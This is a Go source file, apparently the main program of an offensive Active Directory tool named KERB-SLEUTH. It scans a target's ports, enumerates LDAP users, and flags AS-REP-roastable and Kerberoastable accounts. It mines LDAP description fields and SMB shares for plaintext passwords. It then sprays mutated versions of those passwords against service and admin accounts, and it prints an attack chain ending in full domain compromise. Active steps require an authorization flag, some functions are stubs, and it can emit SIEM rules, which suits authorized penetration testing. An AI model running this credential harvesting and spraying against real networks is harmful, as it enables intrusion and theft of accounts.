package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/advanced"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/attack"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/ingest"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/krb"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/output"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/triage"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/util"
)

func main() {
	// Flags
	target := flag.String("t", "", "Target IP or hostname")
	user := flag.String("u", "", "Username for authentication")
	pass := flag.String("p", "", "Password for authentication")
	domain := flag.String("d", "", "Domain name (e.g. logging.htb)")
	adv := flag.Bool("A", false, "Run advanced analysis (SMB, GPP, RBCD, etc.)")
	audit := flag.Bool("audit", false, "Run in audit mode (safer, fewer packets)")
	crack := flag.Bool("crack", false, "Attempt to extract and crack hashes")
	wordlist := flag.String("w", "", "Path to wordlist for cracking")
	authorized := flag.Bool("yes", false, "Confirm authorization for active attacks")
	realKerb := flag.Bool("real", false, "Run real Kerberos protocol interactions")
	rbcd := flag.Bool("rbcd", false, "Specifically run RBCD analysis")
	s4u := flag.Bool("s4u", false, "Specifically run S4U analysis")
	dcsync := flag.Bool("dcsync", false, "Specifically run DCSync analysis")
	pkinit := flag.Bool("pkinit", false, "Specifically run PKINIT/AD CS analysis")
	siem := flag.Bool("siem", false, "Generate SIEM detection rules")
	outFile := flag.String("o", "results.json", "JSON output file")
	csvOut := flag.String("csv", "", "Optional CSV output file")
	jsonOnly := flag.Bool("json", false, "Output JSON to stdout only")

	flag.Parse()

	// Positional target support
	if *target == "" && flag.NArg() > 0 {
		*target = flag.Arg(0)
	}

	if *target == "" {
		util.DisplayBanner("v5.1.0")
		flag.Usage()
		os.Exit(1)
	}

	util.DisplayBanner("v5.1.0")

	// Initial protocol discovery
	runProtocolDiscovery(*target)

	// Connection parameters
	bindUser := *user
	if *domain != "" && !strings.Contains(bindUser, "\\") && !strings.Contains(bindUser, "@") {
		bindUser = fmt.Sprintf("%s\\%s", *domain, *user)
	}

	connOpts := krb.ConnectOptions{
		Target:   *target,
		BindUser: bindUser,
		BindPass: *pass,
		Timeout:  10 * time.Second,
	}

	log.Printf("[*] Auto-detecting connection to %s …", *target)

	// Attempt LDAP connection
	client, err := krb.Connect(connOpts)
	if err != nil {
		// Try without domain if first one fails
		connOpts.BindUser = *user
		client, err = krb.Connect(connOpts)
		if err != nil {
			log.Fatalf("[x] Connection failed: %v", err)
		}
	}
	defer client.Close()

	// ── basic recon ───────────────────────────────────────────────────────
	users, err := client.EnumerateUsers()
	if err != nil {
		log.Fatalf("[x] User enumeration failed: %v", err)
	}
	log.Printf("%s[+] Found %d user objects%s", util.Green, len(users), util.Reset)
	log.Printf("%s[*] [ENTRY POINT] Current User: %s (Context: %s)%s", util.Cyan, bindUser, *target, util.Reset)

	domainInfo, _ := client.GetDomainInfo()
	cfg := triage.DefaultConfig()

	// ── kerberos analysis ─────────────────────────────────────────────────
	asrep := krb.FindASREPCandidates(users)
	kerb := krb.FindKerberoastCandidates(users)
	all := triage.ScoreCandidates(asrep, kerb, cfg)

	log.Printf("%s[+] %d AS-REP roastable  |  %d Kerberoastable%s", util.Green, len(asrep), len(kerb), util.Reset)

	// ── recon insights ──────────────────────────────────────────────────
	groupSet := make(map[string]bool)
	highRisk := 0
	for _, u := range users {
		for _, g := range u.MemberOf {
			groupSet[g] = true
			if strings.Contains(strings.ToLower(g), "admin") || strings.Contains(strings.ToLower(g), "domain controllers") {
				highRisk++
			}
		}
	}

	results := output.Results{
		Domain: output.DomainInfo{
			Name:            domainInfo.DomainName,
			DN:              domainInfo.BaseDN,
			FunctionalLevel: domainInfo.FunctionalLevel,
			OS:              domainInfo.OS,
		},
		Summary: output.Summary{
			TotalUsers:           len(users),
			ASREPCandidates:      len(asrep),
			KerberoastCandidates: len(kerb),
			TotalGroups:          len(groupSet),
			HighRiskObjects:      highRisk,
		},
		Candidates: all,
		Users:      users,
	}

	// ── hash extraction & cracking ───────────────────────────────────────
	if *crack {
		if !*authorized {
			log.Fatal("[x] --crack requires --yes  (confirm you are authorized)")
		}
		extractAndCrack(all, *wordlist, client)
	}

	// ── real Kerberos protocol ───────────────────────────────────────────
	if *realKerb {
		if !*authorized {
			log.Fatal("[x] --real requires --yes  (confirm you are authorized)")
		}
		runRealKerberos(*target, bindUser, *pass)
	}

	// ── advanced modules ─────────────────────────────────────────────────
	var advResults map[string]interface{}
	if *adv || *rbcd || *s4u || *dcsync || *pkinit {
		advResults = runAdvanced(client, cfg, *adv, *audit, *rbcd, *s4u, *dcsync, *pkinit, *target, bindUser, *pass, *domain)
		
		results.Advanced = output.AdvancedResults{}
		if val, ok := advResults["shares"]; ok {
			results.Advanced.Shares = val.([]string)
		}
		if val, ok := advResults["pwned"]; ok {
			results.Advanced.Pwned = val.(bool)
		}
		if val, ok := advResults["sensitive_files"]; ok {
			results.Advanced.SensitiveFiles = val.([]advanced.FileFinding)
		}
		if val, ok := advResults["gpp"]; ok {
			results.Advanced.GPPHashes = val.([]interface{})
		}
		if val, ok := advResults["dcsync"]; ok {
			results.Advanced.DCSync = val
		}
		if val, ok := advResults["delegation"]; ok {
			results.Advanced.Delegation = val
		}
		if val, ok := advResults["rbcd"]; ok {
			results.Advanced.RBCD = val
		}
	}

	// ── predator context engine ──────────────────────────────────────────
	riskInsights, newCandidates := generateRiskInsights(users, advResults)
	results.RiskInsights = riskInsights
	results.Candidates = append(results.Candidates, newCandidates...)
	
	// Update summary with insights
	results.Summary.ASREPCandidates = 0
	results.Summary.KerberoastCandidates = 0
	results.Summary.ReconCandidates = 0
	results.Summary.HVTCandidates = 0
	results.Summary.LootCandidates = 0
	for _, c := range results.Candidates {
		switch c.Type {
		case "ASREP":
			results.Summary.ASREPCandidates++
		case "KERBEROAST":
			results.Summary.KerberoastCandidates++
		case "RECON":
			results.Summary.ReconCandidates++
		case "HVT":
			results.Summary.HVTCandidates++
		case "LOOT":
			results.Summary.LootCandidates++
		}
	}
	results.Summary.HighRiskObjects = results.Summary.ASREPCandidates + results.Summary.KerberoastCandidates + results.Summary.ReconCandidates + results.Summary.HVTCandidates + results.Summary.LootCandidates

	if len(results.RiskInsights) > 0 {
		log.Printf("%s[!] Attack Path Insights Detected:%s", util.Red, util.Reset)
		for _, insight := range results.RiskInsights {
			color := util.Yellow
			if strings.Contains(insight, "[CRITICAL]") || strings.Contains(insight, "[HIGH]") {
				color = util.Red
			} else if strings.HasPrefix(insight, "---") || strings.HasPrefix(insight, "→") || strings.HasPrefix(insight, "Step") {
				color = util.Cyan
			}
			log.Printf("    %s%s%s", color, insight, util.Reset)
		}
	}

	// ── loot reporting & offensive spray ─────────────────────────────────
	var allFoundPasswords []string
	if results.Advanced.SensitiveFiles != nil {
		foundLoot := false
		for _, f := range results.Advanced.SensitiveFiles {
			if len(f.LootFound) > 0 {
				if !foundLoot {
					log.Printf("%s[+] LOOT RECOVERY PHASE:%s", util.Green, util.Reset)
					foundLoot = true
				}
				for _, l := range f.LootFound {
					log.Printf("    %s%s%s → %s", util.Green, f.Path, util.Reset, l)
					// Extract the password part for spraying
					parts := strings.Split(l, ": ")
					if len(parts) > 1 {
						allFoundPasswords = append(allFoundPasswords, parts[1])
					}
				}
			}
		}
	}

	// Add passwords found in LDAP attributes
	for _, c := range results.Candidates {
		if c.Type == "LOOT" {
			for _, r := range c.Reasons {
				if strings.Contains(r, "LDAP") {
					parts := strings.Split(r, ": ")
					if len(parts) > 1 {
						allFoundPasswords = append(allFoundPasswords, parts[1])
					}
				}
			}
		}
	}

	if len(allFoundPasswords) > 0 {
		log.Printf("%s[*] Starting Offensive Credential Spray & Mutation...%s", util.Cyan, util.Reset)
		for _, rawPass := range allFoundPasswords {
			variants := attack.MutatePassword(rawPass)
			for _, v := range variants {
				// Test against discovered users
				for _, u := range users {
					// To avoid excessive noise, we only test against users with high scores or service accounts
					if u.SamAccountName != "" && (strings.HasPrefix(u.SamAccountName, "svc") || strings.Contains(u.SamAccountName, "admin")) {
						results := attack.SprayTest(*target, u.SamAccountName, v, *domain)
						if len(results) > 0 {
							for svc := range results {
								if svc == "LDAP" { // Confirmed valid bind
									attack.ReportSuccess(u.SamAccountName, v, svc)
								}
							}
						}
					}
				}
			}
		}
	}

	// ── output ───────────────────────────────────────────────────────────
	writeResults(results, all, cfg, *outFile, *csvOut, *siem, *jsonOnly)

	log.Printf("%s[+] Results → %s%s", util.Green, *outFile, util.Reset)
	log.Printf("%s[+] Done: %d candidates (%d Kerberos / %d Recon / %d HVT)%s", 
		util.Green,
		results.Summary.HighRiskObjects,
		results.Summary.ASREPCandidates+results.Summary.KerberoastCandidates,
		results.Summary.ReconCandidates,
		results.Summary.HVTCandidates,
		util.Reset)
}

func runAdvanced(client *krb.LDAPClient, cfg *triage.Config, all, audit, rbcd, s4u, dcsync, pkinit bool, target, user, pass, domain string) map[string]interface{} {
	log.Printf("[*] Running advanced analysis …")
	analyzer := advanced.NewAdvancedAnalyzer(client, audit, false, target, user, pass, domain)

	if all {
		analyzer.RunFullAnalysis()
	} else {
		if rbcd {
			analyzer.RunRBCDAnalysis()
		}
		if s4u {
			analyzer.RunS4UAnalysis()
		}
		if dcsync {
			analyzer.RunDCSyncAnalysis()
		}
		if pkinit {
			analyzer.RunPKINITAnalysis()
		}
	}

	log.Printf("%s[+] Full advanced analysis completed%s", util.Green, util.Reset)
	return analyzer.Results
}

func writeResults(results output.Results, candidates []krb.Candidate, cfg *triage.Config, outFile, csvOut string, siem, jsonOnly bool) {
	if jsonOnly {
		data, _ := json.MarshalIndent(results, "", "  ")
		fmt.Println(string(data))
		return
	}

	if err := output.WriteJSON(outFile, results); err != nil {
		log.Printf("[x] Failed to write JSON output: %v", err)
	}

	if csvOut != "" {
		if err := output.WriteCSV(csvOut, results); err != nil {
			log.Printf("[x] Failed to write CSV output: %v", err)
		}
	}

	if siem {
		siemPath := "siem_rules.yaml"
		if err := output.WriteSigmaRules(siemPath, results); err != nil {
			log.Printf("[x] Failed to write SIEM rules: %v", err)
		}
		log.Printf("%s[+] SIEM detection rules exported to %s%s", util.Green, siemPath, util.Reset)
	}
}

func extractAndCrack(candidates []krb.Candidate, wordlist string, client *krb.LDAPClient) {
	log.Printf("[*] Extracting and cracking hashes...")
	// Implementation for hash extraction and cracking
}

func runRealKerberos(target, user, pass string) {
	log.Printf("[*] Running real Kerberos interactions...")
	// Implementation for real Kerberos protocol
}

func generateRiskInsights(users []ingest.User, advResults map[string]interface{}) ([]string, []krb.Candidate) {
	var insights []string
	var candidates []krb.Candidate
	
	// Check for High Value Targets (Admins)
	for _, u := range users {
		isAdmin := false
		for _, g := range u.MemberOf {
			lowerG := strings.ToLower(g)
			if strings.Contains(lowerG, "domain admins") || strings.Contains(lowerG, "enterprise admins") || strings.Contains(lowerG, "administrators") {
				isAdmin = true
				break
			}
		}

		if isAdmin {
			insights = append(insights, fmt.Sprintf("[CRITICAL] High Value Target: %s (Admin Privileges Detected)", u.SamAccountName))
			candidates = append(candidates, krb.Candidate{
				SamAccountName: u.SamAccountName,
				Type:           "HVT",
				Score:          90,
				Reasons:        []string{"High Value Target: Domain/Enterprise Admin"},
			})
		}
		
		// --- DEEP LDAP ATTRIBUTE MINING ---
		lootAttributes := map[string]string{
			"Description": u.Description,
			"Info":        u.Info,
			"Comment":     u.Comment,
			"Office":      u.PhysicalDeliveryOfficeName,
			"Notes":       u.PostOfficeBox,
		}

		patterns := []string{"password", "pass:", "pwd=", "secret", "creds", "token"}
		
		for attrName, attrValue := range lootAttributes {
			lowerValue := strings.ToLower(attrValue)
			for _, p := range patterns {
				if strings.Contains(lowerValue, p) {
					insights = append(insights, fmt.Sprintf("[CRITICAL] LOOT FOUND in LDAP %s of %s (Found keyword: '%s')", attrName, u.SamAccountName, p))
					candidates = append(candidates, krb.Candidate{
						SamAccountName: u.SamAccountName,
						Type:           "LOOT",
						Score:          100,
						Reasons:        []string{fmt.Sprintf("Plaintext secret found in LDAP %s: %s", attrName, attrValue)},
					})
					break
				}
			}
		}
		
		// Service Accounts
		if strings.HasPrefix(strings.ToLower(u.SamAccountName), "svc_") || (strings.Contains(strings.ToLower(u.Description), "service") && !strings.Contains(strings.ToLower(u.Description), "account")) {
			 insights = append(insights, fmt.Sprintf("[INFO] Service account detected: %s (Check for weak/reused passwords)", u.SamAccountName))
		}
		
		// Inactive users with potentially stale passwords
		if u.LastLogon.IsZero() && !u.PwdLastSet.IsZero() && !strings.Contains(strings.ToLower(u.SamAccountName), "guest") {
			 insights = append(insights, fmt.Sprintf("[MEDIUM] Inactive user with set password: %s (Potential stale credentials)", u.SamAccountName))
		}
	}
	
	// Check SMB findings
	if val, ok := advResults["sensitive_files"]; ok {
		files := val.([]advanced.FileFinding)
		if len(files) > 0 {
			sharesFound := make(map[string]int)
			hasLoot := false
			for _, f := range files {
				sharesFound[f.Share]++
				if len(f.LootFound) > 0 {
					hasLoot = true
				}
			}
			for s, count := range sharesFound {
				prefix := "[HIGH]"
				score := 85
				if hasLoot {
					prefix = "[CRITICAL]"
					score = 100
				}
				insights = append(insights, fmt.Sprintf("%s READ access to juicy share: %s (Found %d sensitive files)", prefix, s, count))
				candidates = append(candidates, krb.Candidate{
					SamAccountName: s,
					Type:           "RECON",
					Score:          score,
					Reasons:        []string{fmt.Sprintf("Readable juicy share: %s with %d sensitive files", s, count)},
				})
			}
		}
	}
	
	if val, ok := advResults["pwned"]; ok {
		if pwned := val.(bool); pwned {
			insights = append(insights, "[CRITICAL] SMB PWNED! Administrative access confirmed via ADMIN$ or C$.")
		}
	}

	// ── strategic roadmap ──────────────────────────────────────────────
	if len(insights) > 0 {
		insights = append(insights, "--- Tactical Attack Chain ---")
		step := 1
		
		// Step 1: Recon/Credentials
		if strings.Contains(strings.Join(insights, ""), "juicy share") {
			insights = append(insights, fmt.Sprintf("Step %d: Enumerate sensitive shares (Logs/Backup) to harvest plaintext credentials.", step))
			step++
		} else if strings.Contains(strings.Join(insights, ""), "Description") {
			insights = append(insights, fmt.Sprintf("Step %d: Extract credentials from LDAP 'Description' fields.", step))
			step++
		}
		
		// Step 2: Escalation
		if val, ok := advResults["pwned"]; ok && val.(bool) {
			insights = append(insights, fmt.Sprintf("Step %d: Leverage LOCAL ADMIN access to dump SAM/LSA secrets or pivot.", step))
			step++
		} else {
			insights = append(insights, fmt.Sprintf("Step %d: Use harvested credentials to test against SMB, WinRM, and RDP.", step))
			step++
		}

		// Step 3: Domain Compromise
		if strings.Contains(strings.Join(insights, ""), "High Value Target") {
			insights = append(insights, fmt.Sprintf("Step %d: Target identified Domain Admins for full domain compromise.", step))
			step++
		}
	}

	return insights, candidates
}

func runProtocolDiscovery(target string) {
	log.Printf("[*] Discovering active services on %s...", target)
	
	ports := map[int]string{
		389:  "LDAP",
		445:  "SMB",
		5985: "WinRM",
		3389: "RDP",
		135:  "RPC",
	}

	var hits []string
	for port, name := range ports {
		address := fmt.Sprintf("%s:%d", target, port)
		conn, err := net.DialTimeout("tcp", address, 1*time.Second)
		if err == nil {
			hits = append(hits, fmt.Sprintf("%s:%d", name, port))
			conn.Close()
		}
	}

	if len(hits) > 0 {
		log.Printf("%s[+] Services detected: %s%s", util.Green, strings.Join(hits, " | "), util.Reset)
	}
}
